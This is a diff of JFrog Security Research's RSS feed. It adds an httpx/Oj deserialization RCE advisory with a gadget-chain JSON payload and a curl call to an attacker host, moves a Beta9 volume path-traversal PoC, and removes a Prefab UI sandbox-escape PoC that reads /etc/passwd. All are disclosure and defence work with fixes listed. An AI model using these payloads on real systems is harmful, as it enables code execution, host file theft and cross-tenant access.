@@ -4,11 +4,142 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Mon, 16 Nov 2026 00:29:54 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 16 Nov 2026 11:05:12 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/httpx-is-vulnerable-to-remote-code-execution-via-oj-object-mode-deserialization-cve-2026-129784/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/httpx-is-vulnerable-to-remote-code-execution-via-oj-object-mode-deserialization-cve-2026-129784/</guid>
+            <pubDate>Mon, 16 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-129784, HIGH, httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization
+
+## Component
+
+httpx (gitlab.com/os85/httpx)
+
+## Affected versions
+
+1.9.0
+
+## Description
+
+httpx parses JSON response bodies through its transcoder layer. When the oj gem is loaded and multi_json is absent from the bundle, HTTPX::Response#json decodes the body with Oj.load(response.to_s) and no mode option (lib/httpx/transcoder/json.rb), so Oj runs in its shipped default :object mode. In that mode a JSON document can instantiate any already-loaded Ruby class and set its instance variables, which turns a fetched response body into attacker-controlled Ruby objects.
+
+An attacker who can influence the URL an application fetches reaches this sink over the network with no user interaction. With ActiveSupport loaded, as in any Rails application, a universal gadget chain through ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy and ActiveSupport::Cache::Coder::LazyEntry reaches Kernel.load and executes an attacker-chosen file, giving remote code execution as the application user. The file can be staged without any upload feature: an ordinary multipart/form-data POST makes Rack materialize the body as a tempfile reachable through /dev/fd/N. Applications that keep multi_json installed, pin a safe process-wide Oj.default_options, or pass an explicit safe mode at the call site are not affected. Fixed in httpx 1.9.1.
+
+## PoC
+
+<br>
+
+**Step 1 - Build and start a vulnerable httpx 1.9.0 service**
+
+<br>
+
+The lab app loads oj before httpx, then ActiveSupport, and exposes POST /preview, which calls HTTPX.get(url).json on a client-supplied URL.
+
+```
+FROM ruby@sha256:ca8b5f9a8b6533925dfa355f7fbadb64cbfd801cb7e8fa87260ef8a2eae964cc
+RUN apk add --no-cache --virtual .build build-base \
+&& gem install httpx --version 1.9.0 --no-document \
+&& gem install oj --version 3.17.7 --no-document \
+&& gem install activesupport puma rack --no-document \
+&& apk del .build
+WORKDIR /app
+COPY app.rb .
+EXPOSE 8080
+CMD ["ruby", "app.rb"]
+```
+
+<br>
+
+```
+docker build -t httpx-victim .
+docker run -d --name httpx-victim -p 8080:8080 httpx-victim
+```
+
+<br>
+
+**Step 2 - Stage the payload through an ordinary multipart POST**
+
+<br>
+
+Rack materializes multipart file parts as tempfiles with live descriptors in the app process, so no upload feature is needed.
+
+```
+curl -s -F "file=@/tmp/payload.rb;type=application/octet-stream" http://127.0.0.1:8080/preview >/dev/null
+```
+
+<br>
+
+**Step 3 - Point /preview at the gadget document**
+
+<br>
+
+Serve a JSON document carrying the ActiveSupport chain, with value aimed at /dev/fd/N, and spray descriptor numbers downward until the staged tempfile executes:
+
+```
+{"^o":"ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy",
+ "instance":{"^o":"ActiveSupport::Cache::Coder::LazyEntry",
+             "serializer":{"^c":"Kernel"},
+             "compressor":false,"resolved":false,
+             "value":"/dev/fd/N"},
+ "method":"value","var":"@x","deprecator":{"^c":"Kernel"}}
+```
+
+<br>
+
+```
+curl -s -X POST http://127.0.0.1:8080/preview \
+  -H 'content-type: application/json' \
+  -d '{"url":"http://<attacker-host>:8899/load?fd=N"}'
+```
+
+<br>
+
+Touching the parsed value (even preview['title']) enters DeprecatedInstanceVariableProxy#method_missing, which calls LazyEntry#value, which calls Kernel.load on the staged file.
+
+<br>
+
+**Step 4 - Confirm code execution inside the container**
+
+<br>
+
+```
+docker exec httpx-victim cat /tmp/pwned.txt
+```
+
+<br>
+
+Expected output:
+
+```
+RCE via httpx+Oj :object pid=1
+```
+
+## Vulnerability Mitigations
+
+Upgrade to httpx 1.9.1 or later. The fix passes an explicit { mode: :strict } default to Oj.load in lib/httpx/transcoder/json.rb, so response bodies can no longer instantiate Ruby objects. The change is commit eeb785d ("json: fix oj integration to avoid RCE mode") and is in the v1.9.1 tag.
+
+If upgrading is not possible, pass a safe mode at the call site (response.json(mode: :strict)), or set a safe process-wide default such as Oj.default_options = { mode: :strict } before any untrusted JSON is parsed. Keeping multi_json in the bundle also avoids the Oj fallback entirely.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-129784
+https://gitlab.com/os85/httpx/-/commit/eeb785d3250eee9379494fb62c37c315a31e327c
+https://github.com/HoneyryderChuck/httpx/commit/eeb785d3250eee9379494fb62c37c315a31e327c
+https://github.com/HoneyryderChuck/httpx/releases/tag/v1.9.1
+https://gitlab.com/os85/httpx
+https://github.com/HoneyryderChuck/httpx
+https://rubygems.org/gems/httpx
+https://github.com/ohler55/oj/blob/develop/pages/Security.md
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Contagious Interview - One Interview Away From Infection]]></title>
             <link>https://research.jfrog.com/post/accurasofthire-fake-interview/</link>
@@ -578,141 +709,6 @@ https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
-
-
-## Component
-
-Beta9 gateway and worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-gateway < 0.1.776
-worker < 0.1.756
-
-## Description
-
-A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
-
-A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
-
-Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-```
-pip install beta9
-beta9 configure --token <ANY_WORKSPACE_TOKEN>
-```
-
-<br>
-
-**Step 2 - Save the volume deploy**
-
-<br>
-
-The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
-
-```
-import os
-
-from beta9 import Image, function
-from beta9.abstractions.volume import Volume
-
-
-class TraversalVolume(Volume):
-    def __init__(self, volume_id: str, mount_path: str):
-        super().__init__(name="poc", mount_path=mount_path)
-        self.volume_id = volume_id
-        self.ready = True
-
-
-HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
-
-
-@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
-def read_worker_host():
-    proof = {}
-    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
-        try:
-            with open(f) as fh:
-                proof[f] = fh.read()[:200]
-        except Exception as e:
-            proof[f] = f"<unreadable: {e}>"
-    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
-    return proof
-
-
-if __name__ == "__main__":
-    result = read_worker_host.remote()
-    print("\n===== PoC result (executed inside the sandboxed container) =====")
-    for k, v in result.items():
-        print(f"\n--- {k} ---\n{v}")
-```
-
-<br>
-
-**Step 3 - Deploy and run it**
-
-<br>
-
-```
-python3 poc_volume_traversal.py
-```
-
-<br>
-
-Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
-
-```
-===== PoC result (executed inside the sandboxed container) =====
-
---- /pwn/etc/hostname ---
-<worker hostname>
-
---- /pwn/etc/resolv.conf ---
-<worker resolver configuration>
-
---- /pwn (host /) ---
-['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
-```
-
-<br>
-
-On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
-
-## Vulnerability Mitigations
-
-Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120308
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
             <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</guid>
@@ -920,143 +916,138 @@ https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/prefab-ui-is-vulnerable-to-remote-code-execution-via-a-pyodide-js-bridge-to-deno-cve-2026-120338-jfsa-2026-001699278/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/prefab-ui-is-vulnerable-to-remote-code-execution-via-a-pyodide-js-bridge-to-deno-cve-2026-120338-jfsa-2026-001699278/</guid>
+            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
             <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120338, CRITICAL, Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno]]></description>
+            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
             <content:encoded><![CDATA[
 ## Summary
 
-Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno
+Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
 
 
 ## Component
 
-prefab-ui (github.com/PrefectHQ/prefab)
+Beta9 gateway and worker (github.com/beam-cloud/beta9)
 
 ## Affected versions
 
->= 0.14.0, < 0.21.0
+gateway < 0.1.776
+worker < 0.1.756
 
 ## Description
 
-Prefab UI's Generative UI sandbox runs caller-supplied Python inside Pyodide, which is Python compiled to WebAssembly, in a Deno subprocess. The feature is documented as isolation for untrusted code, including UI written by a model. `PyodideSandbox._start` in `src/prefab_ui/sandbox/_pyodide.py` starts that process with unrestricted `--allow-read`, `--allow-write`, and `--allow-net`. The runner in `src/prefab_ui/sandbox/runner.js` leaves the Deno API on the JavaScript global object. Pyodide's `js` module proxies that global, so the Python can call `Deno.readTextFileSync` and `Deno.writeTextFileSync` on the host. The runner comment and the public docs describe this process as read-only.
+A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
 
-The usual remote path is FastMCP's `GenerativeUI` provider. It registers the MCP tool `generate_prefab_ui` and forwards the tool's `code` argument into this sandbox. There is no extra check on that tool. On a FastMCP server with no authentication configured, any client who can reach the server can call it. With authentication, any client allowed to call tools can. The 10.0 score is the unauthenticated case. The same bug with an authenticated tool caller scores 9.9 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`). Generative UI is opt-in, and the host must have Deno installed. Servers that never execute untrusted code in this sandbox are not exposed.
+A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
 
-A caller who can submit the code can read and write files as the server OS user. On prefab-ui 0.20.2 the same write was used to plant a `.pth` file in the server virtualenv's `site-packages`, and the next Python process that used that environment ran the planted import. The sandbox shipped in 0.14.0 with those Deno permissions, and they were still present in 0.20.2. prefab-ui 0.21.0 revokes read, write, and network permission after startup, before it accepts code.
+Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
 
 ## PoC
 
 <br>
 
-**Step 1 - Install the vulnerable release**
-
-<br>
-
-Deno must be on `PATH`. The sandbox does not start without it.
-
-```
-pip install 'prefab-ui==0.20.2' 'fastmcp[apps]'
-```
-
-<br>
-
-**Step 2 - Start a FastMCP server with Generative UI and no authentication**
+**Step 1 - Install the client and select the deployment**
 
 <br>
 
 ```
-from fastmcp import FastMCP
-from fastmcp.apps.generative import GenerativeUI
-
-mcp = FastMCP("poc")
-mcp.add_provider(GenerativeUI())
-mcp.run(transport="http", host="127.0.0.1", port=8127)
+pip install beta9
+beta9 configure --token <ANY_WORKSPACE_TOKEN>
 ```
 
 <br>
 
-**Step 3 - Call generate_prefab_ui**
+**Step 2 - Save the volume deploy**
 
 <br>
 
-The read returns the host file inside the rendered text. The write creates `/tmp/prefab-ui-sandbox-proof.txt`.
+The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
 
 ```
-import asyncio
-from fastmcp import Client
+import os
 
-READ = """
-import js
-from prefab_ui.components import Text
-secret = js.Deno.readTextFileSync("/etc/passwd")
-leak = Text("EXFIL_BEGIN" + secret + "EXFIL_END")
-"""
+from beta9 import Image, function
+from beta9.abstractions.volume import Volume
 
-WRITE = """
-import js
-from prefab_ui.components import Text
-js.Deno.writeTextFileSync("/tmp/prefab-ui-sandbox-proof.txt", "owned\\n")
-done = Text("write-ok")
-"""
 
-async def main():
-    async with Client("http://127.0.0.1:8127/mcp/") as client:
-        print(await client.call_tool("generate_prefab_ui", {"code": READ}))
-        await client.call_tool("generate_prefab_ui", {"code": WRITE})
+class TraversalVolume(Volume):
+    def __init__(self, volume_id: str, mount_path: str):
+        super().__init__(name="poc", mount_path=mount_path)
+        self.volume_id = volume_id
+        self.ready = True
 
-asyncio.run(main())
-```
 
-<br>
+HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
 
-**Step 4 - Confirm the host file**
 
-<br>
+@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
+def read_worker_host():
+    proof = {}
+    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
+        try:
+            with open(f) as fh:
+                proof[f] = fh.read()[:200]
+        except Exception as e:
+            proof[f] = f"<unreadable: {e}>"
+    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
+    return proof
 
-```
-cat /tmp/prefab-ui-sandbox-proof.txt
-```
 
-<br>
-
-Expected output on prefab-ui 0.20.2. The tool result contains the host passwd file between the markers, and the new file is on the host:
-
-```
-EXFIL_BEGIN
-# User Database
-...
-root:*:0:0:System Administrator:...
-EXFIL_END
-
-owned
+if __name__ == "__main__":
+    result = read_worker_host.remote()
+    print("\n===== PoC result (executed inside the sandboxed container) =====")
+    for k, v in result.items():
+        print(f"\n--- {k} ---\n{v}")
 ```
 
 <br>
 
-On prefab-ui 0.21.0 or later, the same read and write fail with a Deno permission error and do not return or create the host file.
+**Step 3 - Deploy and run it**
+
+<br>
+
+```
+python3 poc_volume_traversal.py
+```
+
+<br>
+
+Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
+
+```
+===== PoC result (executed inside the sandboxed container) =====
+
+--- /pwn/etc/hostname ---
+<worker hostname>
+
+--- /pwn/etc/resolv.conf ---
+<worker resolver configuration>
+
+--- /pwn (host /) ---
+['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
+```
+
+<br>
+
+On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
 
 ## Vulnerability Mitigations
 
-Upgrade prefab-ui to 0.21.0 or later. After the runtime and Prefab sources load, the runner revokes Deno filesystem read, filesystem write, and network permission before it accepts generated code. The process is started with `--no-prompt`, so a later permission request cannot grant them again, and bootstrap network access is limited to `cdn.jsdelivr.net:443`. FastMCP servers that register `GenerativeUI` pick up the fix by running that prefab-ui release.
+Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
 
-The change is https://github.com/PrefectHQ/prefab/pull/538, commit 030f074f85e0b1be0dd44b0283185aecb26337a2, released on 2026-10-26 as v0.21.0.
-
-Until the upgrade, do not register `GenerativeUI` on a server that untrusted clients can reach.
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
 
 ## References
-https://www.cve.org/CVERecord?id=CVE-2026-120338
-https://github.com/PrefectHQ/prefab/security/advisories/GHSA-595q-jv4r-q7j9
-https://github.com/PrefectHQ/prefab/pull/538
-https://github.com/PrefectHQ/prefab/commit/030f074f85e0b1be0dd44b0283185aecb26337a2
-https://github.com/PrefectHQ/prefab/releases/tag/v0.21.0
-https://pypi.org/project/prefab-ui/0.21.0/
-https://github.com/PrefectHQ/prefab/releases/tag/v0.20.2
-https://github.com/PrefectHQ/prefab/releases/tag/v0.14.0
-https://github.com/PrefectHQ/prefab
-https://pypi.org/project/prefab-ui/
+https://www.cve.org/CVERecord?id=CVE-2026-120308
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
+https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
         <item>
